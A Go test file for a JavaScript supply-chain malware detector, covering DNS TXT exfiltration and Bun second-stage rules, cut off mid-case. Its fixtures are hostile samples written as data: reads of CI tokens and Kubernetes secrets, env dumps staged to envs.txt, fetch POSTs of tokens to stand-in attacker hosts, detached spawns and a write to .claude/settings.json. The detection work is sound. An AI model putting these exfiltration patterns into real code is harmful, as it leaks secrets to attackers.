+func TestVuln_DNSTXTExfil_ResolverFromDnsPromises(t *testing.T) {
+	// `import { Resolver } from 'node:dns/promises'` is a real
+	// destructure. The new resolver constructor and resolveTxt
+	// call must register.
+	body := `
+import { Resolver } from 'node:dns/promises';
+const r = new Resolver();
+const t = process.env.GITHUB_TOKEN;
+console.log(t);
+await r.resolveTxt('bt.node.js');
+`
+	if !hasRule(analyze(t, "promises-resolver.mjs", body), RuleDNSTXTExfil) {
+		t.Errorf("Resolver destructured from dns/promises must satisfy the sink")
+	}
+}
+
+func TestSafe_DNSTXT_MyRequireNotAnInlineSink(t *testing.T) {
+	// A helper named `myrequire` ends in the substring `require`.
+	// The inline-require regex must be anchored so the suffix
+	// match does not register as a Node DNS sink.
+	body := `
+function myrequire(name) { return { resolveTxt: () => null }; }
+const handle = myrequire('dns').resolveTxt('zone');
+const t = process.env.GITHUB_TOKEN;
+console.log(handle, t);
+`
+	findings := analyze(t, "myrequire.js", body)
+	if hasRule(findings, RuleDNSTXTExfil) {
+		t.Errorf("myrequire(...) must not match the Node require boundary, got: %+v", findings)
+	}
+}
+
+func TestSafe_DNSTXT_StringInsideTemplateInterpolationNotASink(t *testing.T) {
+	// A template literal's `${...}` interpolation contains a
+	// nested string that quotes a fake resolveTxt example. With
+	// real partner signals present, the sink must NOT register.
+	body := "\n" +
+		"const dns = require('dns');\n" +
+		"const t = process.env.GITHUB_TOKEN;\n" +
+		"require('fs').writeFileSync(require('os').tmpdir() + '/envs.txt', t);\n" +
+		"const tmpl = `prefix ${\"dns.resolveTxt('xh.bt.node.js')\"} suffix`;\n" +
+		"console.log(tmpl);\n"
+	findings := analyze(t, "tmpl-nested.js", body)
+	if hasRule(findings, RuleDNSTXTExfil) {
+		t.Errorf("nested string inside ${...} must not be code-context for sink, got: %+v", findings)
+	}
+}
+
+func TestVuln_DNSTXTExfil_NewlineLeadingOperatorContinuation(t *testing.T) {
+	// `os.tmpdir()` on one line, `+ '/stage.tar.gz'` on the next.
+	// JS continues this as a single statement, so the archive
+	// partner must register.
+	body := `
+const dns = require('dns');
+const os = require('os');
+const archive = os.tmpdir()
+  + '/stage.tar.gz';
+dns.resolveTxt('xh.bt.node.js', () => {});
+console.log(archive);
+`
+	if !hasRule(analyze(t, "leading-op.cjs", body), RuleDNSTXTExfil) {
+		t.Errorf("newline followed by leading `+` operator must keep the same statement")
+	}
+}
+
+func TestSafe_DNSTXT_NestedPropertyChainNotAReceiver(t *testing.T) {
+	// `wrapper.os.tmpdir()` matches `os.tmpdir` as a suffix. The
+	// jsIdentBoundary on the receiver regex must prevent counting
+	// this as a real os.tmpdir call.
+	body := `
+const dns = require('dns');
+const wrapper = { os: { tmpdir: () => '/mock' } };
+const archive = wrapper.os.tmpdir() + '/stage.tar.gz';
+console.log(archive);
+dns.resolveTxt('example.com', () => {});
+`
+	findings := analyze(t, "nested.js", body)
+	if hasRule(findings, RuleDNSTXTExfil) {
+		t.Errorf("nested property chain wrapper.os.tmpdir must not satisfy the receiver match, got: %+v", findings)
+	}
+}
+
+func TestVuln_DNSTXTExfil_RenamedTmpdirDestructure(t *testing.T) {
+	// `const { tmpdir: t } = require('os'); t() + '/...'`. The
+	// local name is `t`, but its source is `tmpdir`, so the
+	// archive anchor must accept the call.
+	body := `
+const dns = require('dns');
+const { tmpdir: t } = require('os');
+const archive = t() + '/stage.tar.gz';
+dns.resolveTxt('xh.bt.node.js', () => {});
+console.log(archive);
+`
+	if !hasRule(analyze(t, "renamed-tmp.cjs", body), RuleDNSTXTExfil) {
+		t.Errorf("renamed os.tmpdir destructure must satisfy the archive anchor")
+	}
+}
+
+func TestVuln_DNSTXTExfil_RenamedFsWriteDestructure(t *testing.T) {
+	// `const { writeFileSync: w } = require('fs'); w('/envs.txt',
+	// ...)`. The local `w` source is writeFileSync; the staging
+	// partner must accept.
+	body := `
+const dns = require('dns');
+const { writeFileSync: w } = require('fs');
+const os = require('os');
+w(os.tmpdir() + '/envs.txt', JSON.stringify(process.env));
+dns.resolveTxt('bt.node.js');
+`
+	if !hasRule(analyze(t, "renamed-fs.cjs", body), RuleDNSTXTExfil) {
+		t.Errorf("renamed fs.writeFileSync destructure must satisfy the staging partner")
+	}
+}
+
+func TestVuln_DNSTXTExfil_FsPromisesWrite(t *testing.T) {
+	// fs.promises.writeFile is the standard promises API.
+	body := `
+const dns = require('dns');
+const fs = require('fs');
+const os = require('os');
+await fs.promises.writeFile(os.tmpdir() + '/envs.txt', JSON.stringify(process.env));
+await dns.promises.resolveTxt('bt.node.js');
+`
+	if !hasRule(analyze(t, "promises.mjs", body), RuleDNSTXTExfil) {
+		t.Errorf("fs.promises.writeFile via verified alias must satisfy the staging partner")
+	}
+}
+
+func TestVuln_DNSTXTExfil_InlineRequireFsPromisesWrite(t *testing.T) {
+	// Compact: require('fs').promises.writeFile(...) inline.
+	body := `
+const dns = require('dns');
+require('fs').promises.writeFile(require('os').tmpdir() + '/envs.txt', JSON.stringify(process.env));
+dns.resolveTxt('xh.bt.node.js', () => {});
+`
+	if !hasRule(analyze(t, "inline-promises.cjs", body), RuleDNSTXTExfil) {
+		t.Errorf("inline require('fs').promises.writeFile must satisfy the staging partner")
+	}
+}
+
+func TestVuln_DNSTXTExfil_CombinedESMOsAndFs(t *testing.T) {
+	// `import os, { platform } from 'os'` introduces both `os`
+	// (default) and `platform`. The default must register so that
+	// `os.tmpdir()` later in the file satisfies the archive
+	// anchor. Same for fs combined imports.
+	body := `
+import dns from 'dns';
+import os, { platform } from 'os';
+import fs, { existsSync } from 'fs';
+const t = process.env.GITHUB_TOKEN;
+fs.writeFileSync(os.tmpdir() + '/envs.txt', t);
+const archive = os.tmpdir() + '/stage.tar.gz';
+console.log(platform(), existsSync(archive));
+await dns.promises.resolveTxt('bt.node.js');
+`
+	if !hasRule(analyze(t, "combined-osfs.mjs", body), RuleDNSTXTExfil) {
+		t.Errorf("combined ESM imports for os/fs must register default alias and satisfy partners")
+	}
+}
+
+func TestVuln_DNSTXTExfil_InlineRequireStaging(t *testing.T) {
+	// Compact payload: inline require('fs').writeFileSync and
+	// require('os').tmpdir with no separate module aliases. Both
+	// inline-require shapes must register the partner.
+	body := `
+const dns = require('dns');
+require('fs').writeFileSync(require('os').tmpdir() + '/envs.txt', JSON.stringify(process.env));
+dns.resolveTxt('exfil.example', () => {});
+`
+	findings := analyze(t, "inline-stage.cjs", body)
+	if !hasRule(findings, RuleDNSTXTExfil) {
+		t.Errorf("inline require('fs').writeFileSync and require('os').tmpdir must satisfy partners, got: %+v", findings)
+	}
+}
+
+func TestSafe_DNSTXT_RenamedDestructureSourceNotBound(t *testing.T) {
+	// `const { tmpdir: getTmp } = require('os')` introduces ONLY
+	// `getTmp`. A separate local `tmpdir()` helper must NOT be
+	// credited as the os anchor just because the destructure
+	// mentions `tmpdir` as the source name.
+	body := `
+const dns = require('dns');
+const { tmpdir: getTmp } = require('os');
+function tmpdir() { return '/local'; }
+const archive = tmpdir() + '/stage.tar.gz';
+dns.resolveTxt('example.com', () => {});
+console.log(getTmp());
+`
+	findings := analyze(t, "renamed.cjs", body)
+	if hasRule(findings, RuleDNSTXTExfil) {
+		t.Errorf("renamed destructure's source name must not be bound, got: %+v", findings)
+	}
+}
+
+func TestSafe_DNSTXT_UnrelatedWriteFileReceiverIsNotAStagingAnchor(t *testing.T) {
+	// `wrapper.writeFileSync(...)` on a local wrapper / mock is
+	// not the fs module method; it must not satisfy the envs.txt
+	// staging partner.
+	body := `
+const dns = require('dns');
+const wrapper = { writeFileSync: (p, v) => null };
+wrapper.writeFileSync('/envs.txt', 'mock');
+dns.resolveTxt('example.com', () => {});
+`
+	findings := analyze(t, "wrapper.js", body)
+	if hasRule(findings, RuleDNSTXTExfil) {
+		t.Errorf("local wrapper.writeFileSync must not satisfy the fs staging anchor, got: %+v", findings)
+	}
+}
+
+func TestSafe_DNSTXT_ASINewlineSeparatesStatements(t *testing.T) {
+	// JavaScript with no trailing semicolons (ASI). The two
+	// statements `const help = '...stage.tar.gz...'` and
+	// `const tmp = os.tmpdir()` are separated by a newline that
+	// ASI promotes to a statement boundary. They must NOT count
+	// as the same statement for the archive partner.
+	body := `
+const dns = require('dns')
+const help = "Use 'stage.tar.gz' in os.tmpdir() to bundle output"
+const tmp = require('os').tmpdir()
+console.log(tmp, help.length)
+dns.resolveTxt('example.com', () => {})
+`
+	findings := analyze(t, "asi.js", body)
+	if hasRule(findings, RuleDNSTXTExfil) {
+		t.Errorf("ASI newline must separate statements; archive partner must not fire, got: %+v", findings)
+	}
+}
+
+func TestVuln_DNSTXTExfil_RegexLiteralBeforeSink(t *testing.T) {
+	// A regex literal with `//` (e.g. `/https?:\/\//`) appears on
+	// the same minified line as a real resolveTxt sink. The walker
+	// must recognize the regex and NOT mask past it as if it were
+	// a `//` line comment, so the resolveTxt call still registers.
+	body := "const dns = require('dns'); const rx = /https?:\\/\\//; const t = process.env.GITHUB_TOKEN; require('fs').writeFileSync(require('os').tmpdir() + '/envs.txt', t); dns.resolveTxt('bt.node.js');\n"
+	findings := analyze(t, "regex-bypass.cjs", body)
+	if !hasRule(findings, RuleDNSTXTExfil) {
+		t.Errorf("regex literal containing // must not mask past it; sink must still register, got: %+v", findings)
+	}
+}
+
+func TestSafe_DNSTXT_DaemonExampleInStringNotAPartner(t *testing.T) {
+	// A help string containing a daemonization snippet must not
+	// satisfy the daemon partner. A real resolveTxt call paired
+	// only with that documentation must not fire the rule.
+	body := `
+const dns = require('dns');
+const example = "cp.spawn('node', ['-e', '...'], {detached: true, stdio: 'ignore'}).unref();";
+async function lookup(domain) {
+  return await dns.promises.resolveTxt(domain);
+}
+module.exports = { example, lookup };
+`
+	findings := analyze(t, "daemon-doc.js", body)
+	if hasRule(findings, RuleDNSTXTExfil) {
+		t.Errorf("daemon snippet inside a string literal must not satisfy the daemon partner, got: %+v", findings)
+	}
+}
+
+func TestSafe_DNSTXT_QuotedArchiveTokenWithoutExecutableTmpdir(t *testing.T) {
+	// A help string mentions stage.tar.gz; an unrelated os.tmpdir
+	// call is elsewhere in code. Neither anchor is in executable
+	// code adjacent to the token, so the archive partner must not
+	// fire.
+	body := `
+const dns = require('dns');
+const help = "Use 'stage.tar.gz' in os.tmpdir() to bundle output.";
+const tmp = require('os').tmpdir();
+console.log(tmp, help.length);
+dns.resolveTxt('example.com', () => {});
+`
+	findings := analyze(t, "help-arc.js", body)
+	if hasRule(findings, RuleDNSTXTExfil) {
+		t.Errorf("archive partner needs executable staging adjacency, got: %+v", findings)
+	}
+}
+
+func TestSafe_DNSTXT_ResolveTxtMethodDefinitionNotACall(t *testing.T) {
+	// An object literal defines its OWN method named resolveTxt.
+	// That is a definition, not an invocation of the imported
+	// function. Importing `{ resolveTxt }` from dns/promises but
+	// using it inside the definition body (and not actually
+	// calling it) must not satisfy the sink.
+	body := `
+import { resolveTxt } from 'dns/promises';
+const api = {
+  resolveTxt(domain) {
+    return null;  // wraps but never invokes the imported one
+  },
+};
+const t = process.env.GITHUB_TOKEN;
+console.log(t);
+module.exports = api;
+`
+	findings := analyze(t, "method-def.mjs", body)
+	if hasRule(findings, RuleDNSTXTExfil) {
+		t.Errorf("method-definition resolveTxt must not satisfy the sink, got: %+v", findings)
+	}
+}
+
+func TestVuln_DNSTXTExfil_BareCallStillFires(t *testing.T) {
+	// Sanity: an actual call to the imported resolveTxt MUST still
+	// fire even though we now reject definitions.
+	body := `
+import { resolveTxt } from 'dns/promises';
+import fs from 'fs';
+import os from 'os';
+const t = process.env.GITHUB_TOKEN;
+fs.writeFileSync(os.tmpdir() + '/envs.txt', t);
+await resolveTxt('bt.node.js');
+`
+	if !hasRule(analyze(t, "bare-call.mjs", body), RuleDNSTXTExfil) {
+		t.Errorf("real bare resolveTxt invocation must still satisfy the sink")
+	}
+}
+
+func TestSafe_DNSTXT_UnrelatedSDKResolverIsNotADNSReceiver(t *testing.T) {
+	// `new someSdk.Resolver()` from a non-dns SDK must NOT register
+	// as a DNS receiver. Even with a real process.env read present,
+	// `r.resolveTxt(...)` should not fire JS_DNS_TXT_EXFIL_001.
+	body := `
+const someSdk = require('graphql');
+const r = new someSdk.Resolver();
+const t = process.env.GITHUB_TOKEN;
+r.resolveTxt('zone'); // graphql Resolver's own resolveTxt, unrelated to dns
+`
+	findings := analyze(t, "graphql.js", body)
+	if hasRule(findings, RuleDNSTXTExfil) {
+		t.Errorf("non-dns Resolver constructor must not register as a DNS receiver, got: %+v", findings)
+	}
+}
+
+func TestSafe_DNSTXT_EnvsTxtPartnerNeedsExecutableWrite(t *testing.T) {
+	// `envs.txt` mentioned inside a doc string + an unrelated env
+	// read (NODE_ENV) in code must not satisfy the envs.txt
+	// partner. The fs-write anchor is required.
+	body := `
+const dns = require('dns');
+const docs = "fs.writeFileSync(os.tmpdir() + '/envs.txt', JSON.stringify(process.env));";
+const mode = process.env.NODE_ENV;
+dns.resolveTxt('example.com', () => {});
+module.exports = { docs, mode };
+`
+	findings := analyze(t, "doc-env.js", body)
+	if hasRule(findings, RuleDNSTXTExfil) {
+		t.Errorf("envs.txt staging needs an executable fs.write near the token, got: %+v", findings)
+	}
+}
+
+func TestVuln_DNSTXTExfil_CombinedESMImports(t *testing.T) {
+	// `import dns, { Resolver } from 'dns'` and the wildcard form
+	// `import dns, * as dnsP from 'dns'` are valid ES module
+	// imports. Both the default identifier and the trailing
+	// clause must register as dns receivers.
+	caseDestructure := `
+import dns, { Resolver } from 'dns';
+import fs from 'fs';
+import os from 'os';
+const t = process.env.GITHUB_TOKEN;
+fs.writeFileSync(os.tmpdir() + '/envs.txt', t);
+dns.resolveTxt('bt.node.js');
+`
+	if !hasRule(analyze(t, "combined-d.mjs", caseDestructure), RuleDNSTXTExfil) {
+		t.Errorf("import default + destructure: default alias must satisfy the sink")
+	}
+
+	caseNamespace := `
+import dns, * as dnsP from 'dns';
+const archive = require('os').tmpdir() + '/stage.tar.gz';
+const t = process.env.GITHUB_TOKEN;
+require('fs').writeFileSync(require('os').tmpdir() + '/envs.txt', t);
+dnsP.resolveTxt('xh.bt.node.js');
+`
+	if !hasRule(analyze(t, "combined-ns.mjs", caseNamespace), RuleDNSTXTExfil) {
+		t.Errorf("import default + namespace: namespace alias must satisfy the sink")
+	}
+
+	caseResolveTxtDestructured := `
+import dns, { resolveTxt } from 'dns/promises';
+import fs from 'fs';
+import os from 'os';
+const t = process.env.AWS_ACCESS_KEY_ID;
+fs.writeFileSync(os.tmpdir() + '/envs.txt', t);
+await resolveTxt('bt.node.js');
+`
+	if !hasRule(analyze(t, "combined-r.mjs", caseResolveTxtDestructured), RuleDNSTXTExfil) {
+		t.Errorf("import default + { resolveTxt } from 'dns/promises': destructured call must satisfy the sink")
+	}
+}
+
+func TestVuln_DNSTXTExfil_DestructuredResolverConstructor(t *testing.T) {
+	// `const { Resolver } = require('node:dns'); const r = new
+	// Resolver(); r.resolveTxt(...)` is the documented Node form;
+	// the alias detector must follow Resolver from destructure to
+	// new-instance binding.
+	body := `
+const { Resolver } = require('node:dns');
+const r = new Resolver();
+const t = process.env.GITHUB_TOKEN;
+require('fs').writeFileSync(require('os').tmpdir() + '/envs.txt', t);
+r.resolveTxt('bt.node.js', () => {});
+`
+	if !hasRule(analyze(t, "destructured-resolver.cjs", body), RuleDNSTXTExfil) {
+		t.Errorf("destructured Resolver + new + resolveTxt must satisfy the sink")
+	}
+}
+
+func TestVuln_DNSTXTExfil_CredentialPathRead(t *testing.T) {
+	// fs.readFileSync against a known credential path is a real
+	// secret read — the path lives inside a string literal but the
+	// partner signal must still register.
+	body := `
+const dns = require('dns');
+const fs = require('fs');
+const token = fs.readFileSync('/var/run/secrets/kubernetes.io/serviceaccount/token');
+dns.resolveTxt('bt.node.js', () => {});
+`
+	if !hasRule(analyze(t, "k8s.js", body), RuleDNSTXTExfil) {
+		t.Errorf("credential path read must satisfy the secret partner, got findings: nope")
+	}
+}
+
+func TestSafe_DNSTXT_PartnerExamplesInsideStringLiterals(t *testing.T) {
+	// A help / readme string contains an envs.txt staging snippet
+	// AND a tar.gz archive snippet, but neither is executable. With
+	// a real resolveTxt call present, the rule must not fire.
+	body := `
+const dns = require('dns');
+const HELP = "fs.writeFileSync(os.tmpdir() + '/envs.txt', JSON.stringify(process.env)); also tar.gz to os.tmpdir";
+async function lookupSPF(domain) {
+  return await dns.promises.resolveTxt('_spf.' + domain);
+}
+module.exports = { HELP, lookupSPF };
+`
+	findings := analyze(t, "help-strings.js", body)
+	if hasRule(findings, RuleDNSTXTExfil) {
+		t.Errorf("stringified partner snippets must not satisfy archive/envs partners, got: %+v", findings)
+	}
+}
+
+func TestSafe_DNSTXT_StringifiedDNSBindingNotAnAlias(t *testing.T) {
+	// A stringified `require('dns')` mention must not register
+	// `dns` as a real alias. Without a real alias binding, an
+	// unrelated `dns.resolveTxt(...)` call elsewhere does not fire.
+	body := `
+const example = "const dns = require('dns');";
+const dns = { resolveTxt: () => null };
+dns.resolveTxt('zone');
+const t = process.env.GITHUB_TOKEN;
+require('fs').writeFileSync(require('os').tmpdir() + '/envs.txt', t);
+`
+	findings := analyze(t, "fake.js", body)
+	if hasRule(findings, RuleDNSTXTExfil) {
+		t.Errorf("stringified require('dns') must not register a real dns alias, got: %+v", findings)
+	}
+}
+
+func TestSafe_DNSTXT_StringLiteralEnvMentionNotAPartner(t *testing.T) {
+	// A documentation string mentions process.env.GITHUB_TOKEN as
+	// usage guidance. The secret partner must not register from
+	// inside a string literal, so a real dns.resolveTxt call paired
+	// only with that string must not fire.
+	body := `
+const dns = require('dns');
+const HELP = "export process.env.GITHUB_TOKEN in CI before running.";
+async function lookup(domain) {
+  return await dns.promises.resolveTxt(domain);
+}
+module.exports = { HELP, lookup };
+`
+	findings := analyze(t, "help.js", body)
+	if hasRule(findings, RuleDNSTXTExfil) {
+		t.Errorf("stringified env-var mention must not satisfy the secret partner, got: %+v", findings)
+	}
+}
+
+func TestVuln_DNSTXTExfil_MultiMemberPromisesDestructure(t *testing.T) {
+	// `{ promises: dns, Resolver }` and the ESM equivalent must
+	// register the `dns` alias as a receiver so subsequent
+	// `dns.resolveTxt(...)` calls fire the rule.
+	cjs := `
+const { promises: dns, Resolver } = require('dns');
+const fs = require('fs');
+const os = require('os');
+const t = process.env.GITHUB_TOKEN;
+fs.writeFileSync(os.tmpdir() + '/envs.txt', t);
+await dns.resolveTxt('bt.node.js');
+`
+	if !hasRule(analyze(t, "multi-cjs.cjs", cjs), RuleDNSTXTExfil) {
+		t.Errorf("CJS multi-member promises destructure must satisfy the sink")
+	}
+
+	esm := `
+import { promises as dns, Resolver } from 'dns';
+import fs from 'fs';
+import os from 'os';
+const archive = os.tmpdir() + '/stage.tar.gz';
+await dns.resolveTxt('xh.bt.node.js');
+`
+	if !hasRule(analyze(t, "multi-esm.mjs", esm), RuleDNSTXTExfil) {
+		t.Errorf("ESM multi-member promises destructure must satisfy the sink")
+	}
+}
+
+func TestSafe_DNSTXT_StringLiteralExampleNotASink(t *testing.T) {
+	// A documentation string contains `dns.resolveTxt(...)` text
+	// even though no DNS call is made. With other partner signals
+	// present, the previous version would still fire HIGH; the
+	// string-interior filter must skip the match.
+	body := `
+const dns = require('dns');
+const doc = "Use dns.resolveTxt('example.com') to query TXT records";
+const t = process.env.GITHUB_TOKEN;
+require('fs').writeFileSync(require('os').tmpdir() + '/envs.txt', t);
+module.exports = { doc };
+`
+	findings := analyze(t, "doc.js", body)
+	if hasRule(findings, RuleDNSTXTExfil) {
+		t.Errorf("string-literal resolveTxt example must not satisfy the sink, got: %+v", findings)
+	}
+}
+
+func TestSafe_DNSTXT_CommentedDaemonExampleIsNotAPartner(t *testing.T) {
+	// A real resolveTxt call alongside ONLY a commented daemon
+	// example must not fire: the daemon partner has to come from
+	// executable code, not from documentation.
+	body := `
+const dns = require('dns');
+// Historical exploit shape:
+//   const cp = require('child_process');
+//   cp.spawn('node', ['-e', '...'], {detached: true, stdio: 'ignore'}).unref();
+dns.resolveTxt('example.com', () => {});
+`
+	findings := analyze(t, "history.js", body)
+	if hasRule(findings, RuleDNSTXTExfil) {
+		t.Errorf("commented daemon example must not satisfy the daemon partner, got: %+v", findings)
+	}
+}
+
+func TestVuln_DNSTXTExfil_PromisesNamespaceDestructure(t *testing.T) {
+	// `const { promises: dns } = require('node:dns')` binds the
+	// promises namespace to a local alias. Calls like
+	// `await dns.resolveTxt(...)` against that alias must register
+	// as the DNS sink.
+	body := `
+const { promises: dns } = require('node:dns');
+const fs = require('fs');
+const os = require('os');
+const t = process.env.GITHUB_TOKEN;
+fs.writeFileSync(os.tmpdir() + '/envs.txt', t);
+await dns.resolveTxt('xh.bt.node.js');
+`
+	findings := analyze(t, "ns.cjs", body)
+	if !hasRule(findings, RuleDNSTXTExfil) {
+		t.Errorf("promises namespace destructure must satisfy the DNS sink, got: %+v", findings)
+	}
+}
+
+func TestVuln_DNSTXTExfil_PromisesNamespaceESM(t *testing.T) {
+	// `import { promises as dns } from 'dns'` is the ESM form.
+	body := `
+import { promises as dns } from 'dns';
+import fs from 'fs';
+import os from 'os';
+const archive = os.tmpdir() + '/stage.tar.gz';
+await dns.resolveTxt('bt.node.js');
+`
+	findings := analyze(t, "esm.mjs", body)
+	if !hasRule(findings, RuleDNSTXTExfil) {
+		t.Errorf("ESM `promises as dns` namespace import must satisfy the DNS sink, got: %+v", findings)
+	}
+}
+
+func TestSafe_DNSTXT_PartnerSignalsInCommentsOnly(t *testing.T) {
+	// A legitimate DNS TXT library that mentions CI tokens and
+	// envs.txt only in comments must not satisfy any partner
+	// signal. With no real chain partners, the rule must not fire.
+	body := `
+const dns = require('dns');
+// In CI, set process.env.GITHUB_TOKEN before calling this module.
+// The helper used to write envs.txt; we removed that behavior.
+/* fs.writeFileSync(os.tmpdir() + '/envs.txt', JSON.stringify(process.env)) */
+async function lookupSPF(domain) {
+  return await dns.promises.resolveTxt(domain);
+}
+module.exports = { lookupSPF };
+`
+	findings := analyze(t, "spf.js", body)
+	if hasRule(findings, RuleDNSTXTExfil) {
+		t.Errorf("commented partner mentions must not satisfy the DNS chain, got: %+v", findings)
+	}
+}
+
+func TestSafe_DNSTXT_CommentedExampleIsNotASink(t *testing.T) {
+	// A documentation file binds the dns module and shows
+	// resolveTxt examples in line and block comments. Even with
+	// partner signals present (CI token + envs.txt write), the rule
+	// must not fire because no executable resolveTxt call exists.
+	body := `
+const dns = require('dns');
+const fs = require('fs');
+const os = require('os');
+// Example: dns.resolveTxt('example.com', cb)
+/* Or: const r = new dns.Resolver(); r.resolveTxt('zone.example') */
+const t = process.env.GITHUB_TOKEN;
+fs.writeFileSync(os.tmpdir() + '/envs.txt', t);
+console.log('see comments above for resolveTxt usage');
+`
+	findings := analyze(t, "docs.js", body)
+	if hasRule(findings, RuleDNSTXTExfil) {
+		t.Errorf("commented resolveTxt examples must not satisfy the sink, got: %+v", findings)
+	}
+}
+
+func TestVuln_DNSTXTExfil_DestructuredTmpdirArchive(t *testing.T) {
+	// `const { tmpdir } = require('os')` plus `tmpdir() + 'stage.tar.gz'`
+	// is the destructured form of os.tmpdir staging. With a real
+	// resolveTxt call accompanying it, the archive partner must
+	// register so the rule fires.
+	body := `
+const dns = require('dns');
+const { tmpdir } = require('os');
+const archive = tmpdir() + '/stage.tar.gz';
+dns.resolveTxt('xh.bt.node.js', () => {});
+`
+	findings := analyze(t, "destructured.cjs", body)
+	if !hasRule(findings, RuleDNSTXTExfil) {
+		t.Errorf("destructured tmpdir + tar.gz archive must satisfy the archive partner, got: %+v", findings)
+	}
+}
+
+func TestSafe_DNSTXT_BareEnvsTxtFilenameOnly(t *testing.T) {
+	// A library that merely stores the filename `envs.txt` as a
+	// constant near a resolveTxt call must NOT set the staging
+	// partner. With no other partners, the rule must not fire.
+	body := `
+const dns = require('dns');
+const filename = 'envs.txt';
+dns.resolveTxt('example.com', () => { /* could log to filename later */ });
+`
+	findings := analyze(t, "bare.js", body)
+	if hasRule(findings, RuleDNSTXTExfil) {
+		t.Errorf("bare envs.txt filename constant must not satisfy the staging partner, got: %+v", findings)
+	}
+}
+
+func TestVuln_DNSTXTExfil_EnvsTxtTemplateLiteralPath(t *testing.T) {
+	// Real payloads frequently use a template-literal path for the
+	// envs.txt staging file. The signal must match regardless of
+	// whether the path is built with `'` strings, `"` strings, or
+	// backtick template literals.
+	body := "\n" +
+		"const dns = require('dns');\n" +
+		"const fs = require('fs');\n" +
+		"const os = require('os');\n" +
+		"fs.writeFileSync(`${os.tmpdir()}/envs.txt`, JSON.stringify(process.env));\n" +
+		"const archive = os.tmpdir() + '/stage.tar.gz';\n" +
+		"dns.resolveTxt('exfil.example', () => {});\n"
+	findings := analyze(t, "tmpl.js", body)
+	if !hasRule(findings, RuleDNSTXTExfil) {
+		t.Errorf("template-literal envs.txt path must satisfy the staging signal, got: %+v", findings)
+	}
+}
+
+func TestVuln_DNSTXTExfil_ArchiveProximityCrossLines(t *testing.T) {
+	// path.join wrapping splits os.tmpdir and the .tar.gz across
+	// lines. The archive proximity match must span the newlines.
+	body := `
+const dns = require('dns');
+const os = require('os');
+const path = require('path');
+const archive = path.join(
+  os.tmpdir(),
+  'stage.tar.gz',
+);
+dns.resolveTxt('xh.bt.node.js', () => {});
+`
+	findings := analyze(t, "split.js", body)
+	if !hasRule(findings, RuleDNSTXTExfil) {
+		t.Errorf("multi-line tar.gz / os.tmpdir proximity must still satisfy archive signal, got: %+v", findings)
+	}
+}
+
+func TestSafe_DNSTXT_StringMentionNotCall(t *testing.T) {
+	// A bare string mention of `resolveTxt` (in a comment, a JSON
+	// manifest, or documentation) without a real call must not
+	// satisfy the sink signal.
+	body := `
+// This module wraps dns.resolveTxt; see docs.
+const features = ['resolveTxt', 'resolve4'];
+const t = process.env.GITHUB_TOKEN;
+fetch('https://attacker/x', {body:t});
+`
+	findings := analyze(t, "docs.js", body)
+	if hasRule(findings, RuleDNSTXTExfil) {
+		t.Errorf("string mention of resolveTxt must not satisfy the DNS sink, got: %+v", findings)
+	}
+}
+
+// --- finding shape regression ---
+
+func TestFindingsHaveStableFields(t *testing.T) {
+	body := `
+const t = process.env.GITHUB_TOKEN;
+fetch('https://attacker/x', {method:'POST', body:t});
+require('fs').writeFileSync(process.env.HOME + '/.claude/settings.json', '{}');
+const cp = require('child_process');
+const c = cp.spawn('node', ['x'], {detached: true, stdio: 'ignore'}); c.unref();
+const m = require('fs').readFileSync('/proc/self/maps');
+if (m.includes(process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN)) {}
+`
+	findings := analyze(t, "full.js", body)
+	if len(findings) == 0 {
+		t.Fatalf("expected findings, got none")
+	}
+	seenLines := map[int]string{}
+	for _, f := range findings {
+		if f.Analyzer != AnalyzerName {
+			t.Errorf("finding %s: analyzer = %q, want %q", f.RuleID, f.Analyzer, AnalyzerName)
+		}
+		if f.Category != "supply-chain" {
+			t.Errorf("finding %s: category = %q, want supply-chain", f.RuleID, f.Category)
+		}
+		if !strings.HasPrefix(f.RuleID, "JS_") && !strings.HasPrefix(f.RuleID, "AGENT_") {
+			t.Errorf("finding ruleID %q should have JS_ or AGENT_ prefix", f.RuleID)
+		}
+		if f.Confidence == 0 {
+			t.Errorf("finding %s: confidence should be > 0", f.RuleID)
+		}
+		if f.Remediation == "" {
+			t.Errorf("finding %s: remediation should be non-empty", f.RuleID)
+		}
+		if f.Line == 0 {
+			t.Errorf("finding %s: line should be > 0", f.RuleID)
+		}
+		if prev, ok := seenLines[f.Line]; ok {
+			t.Logf("two findings on line %d: %s and %s (cross-rule dedup may drop one)", f.Line, prev, f.RuleID)
+		}
+		seenLines[f.Line] = f.RuleID
+	}
+}
+
+// TestBunSecondStage covers JS_BUN_SECOND_STAGE_001: Bun used as a
+// suspicious second stage. Execution alone never fires; a partner signal
+// (download, obfuscation, CI secret read, exfil sink, staged write) is
+// required, and a CI secret read + exfil sink escalates to CRITICAL.
+func TestBunSecondStage(t *testing.T) {
+	cases := []struct {
+		name    string
+		content string
+		want    bool
+		crit    bool // when want, assert CRITICAL (else HIGH)
+	}{
+		{
+			name: "spawn bun + obfuscator shape",
+			content: `const cp = require('child_process');
+while(!![]){ var _0xabc = 1; }
+cp.spawn('bun', ['./stage.mjs']);`,
+			want: true,
+		},
+		{
+			name: "bun exec + GITHUB_TOKEN read + network sink -> CRITICAL",
+			content: `const cp = require('child_process');
+cp.spawn('bun', ['./x.mjs']);
+const t = process.env.GITHUB_TOKEN;
+fetch('https://evil.example/c', { method: 'POST', body: t });`,
+			want: true,
+			crit: true,
+		},
+		{
+			// Multi-declarator alias (cp bound to child_process in a comma
+			// list) + a network sink. Proves the alias collector binds the
+			// multi-var form and the network-call partner is strong. Uses a
+			// literal payload target (a variable target is the documented
+			// precision tradeoff below).
+			name: "multi-var cp.spawn bun + network sink",
+			content: `const fs = require('fs'), os = require('os'), cp = require('child_process');
+cp.spawn('bun', ['./stage.mjs']);
+fetch('https://evil.example/c', { method: 'POST' });`,
+			want: true,
+		},
+		{
+			// Precision tradeoff: a bun launch whose payload is a VARIABLE
+			// (not a literal path/.js/-e) is not matched, so a benign
+			// `spawn('bun', [subcmd])` cannot be mistaken for a payload run.
+			// Recall cost: a malicious variable-target spawn is missed.
+			name: "spawn bun with variable target is not matched (precision tradeoff)",
+			content: `const cp = require('child_process');
+const p = computePath();
+cp.spawn('bun', [p]);
+fetch('https://evil.example/c', { method: 'POST' });`,
+			want: false,
+		},
+		{
+			name: "exec string form (bun run inside execSync) + network sink",
+			content: `const cp = require('child_process');
+cp.execSync('bun run ./stage.mjs');
+fetch('https://evil.example/c', { method: 'POST' });`,
+			want: true,
+		},
+		{
+			name: "shelljs alias exec bun run + secret + sink -> CRITICAL",
+			content: `const sh = require('shelljs');
